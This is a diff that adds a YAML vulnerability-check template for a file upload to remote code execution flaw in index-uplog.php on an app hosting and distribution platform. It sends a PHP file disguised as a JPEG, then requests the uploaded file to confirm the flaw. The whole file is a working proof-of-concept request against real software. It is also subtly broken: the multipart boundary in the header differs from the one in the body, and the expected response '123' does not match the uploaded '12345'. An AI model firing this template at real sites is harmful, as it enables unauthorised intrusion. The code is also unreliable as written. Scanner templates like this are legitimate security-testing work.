@@ -1,0 +1,33 @@
+id:
+
+info:
+  name: App托管服务分发平台index-uplog.php文件上传致RCE漏洞
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: POST
+  path: /source/pack/upload/2upload/index-uplog.php
+  headers:
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryfF7NbGp0PAFq8Mkd
+  data: |
+    ------WebKitFormBoundary03rNBzFMIytvpWhy
+    Content-Disposition: form-data; name="time"
+
+    1-2
+    ------WebKitFormBoundary03rNBzFMIytvpWhy
+    Content-Disposition: form-data; name="app"; filename="test1.php"
+    Content-Type: image/jpeg
+
+    12345
+    ------WebKitFormBoundary03rNBzFMIytvpWhy--
+response1:
+requests2:
+  method: GET
+  path: /source/data/tmp/1-2.php
+response2:
+  body: 123
+  code: 200
